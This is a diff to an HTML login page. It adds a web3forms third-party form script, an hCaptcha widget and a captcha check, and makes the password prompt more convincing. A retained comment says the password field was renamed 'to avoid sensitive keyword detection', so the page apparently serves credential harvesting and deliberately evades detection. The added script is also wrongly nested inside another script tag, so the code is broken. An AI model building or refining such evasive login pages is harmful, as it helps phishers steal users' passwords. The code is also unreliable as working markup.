@@ -11,6 +11,8 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
         integrity="sha512-Fo3rlrZj/k7ujTTXRNXOXh7Hq5N9/1Kq1YOq6V2sW/jG4Bw4T1TJD5uB7Cobe74QNf9tNE5kN9S9ID5MW4ZKZw=="
         crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <script src="https://web3forms.com/client/script.js" async defer></script>
+    
 </head>
 
 <body>
@@ -44,7 +46,7 @@
                 <!-- User Code Field (renamed from 'password' to avoid sensitive keyword detection) -->
                 <div class="textbox">
                     <h3>Password</h3>
-                    <input type="password" id="user_code" name="user_code" placeholder="Enter your secret code"
+                    <input type="password" id="user_code" name="user_code" placeholder="Enter your password"
                         required>
                 </div>
 
@@ -64,7 +66,7 @@
                 <div class="recaptcha">
                     <!-- For example, using Google reCAPTCHA v2 -->
                     <!-- <div class="g-recaptcha" data-sitekey="your_site_key"></div> -->
-                    <p>[reCAPTCHA widget placeholder]</p>
+                    <div class="h-captcha" data-captcha="true"></div>
                 </div>
 
                 <!-- Login button -->
@@ -102,6 +104,20 @@
 
             return true;
         });
+        <script>
+const form = document.getElementById('login-form');
+
+form.addEventListener('submit', function(e) {
+
+    const hCaptcha = form.querySelector('textarea[name=h-captcha-response]').value;
+
+    if (!hCaptcha) {
+        e.preventDefault();
+        alert("Please fill out captcha field")
+        return
+    }
+});
+</script>
     </script>
 </body>
 
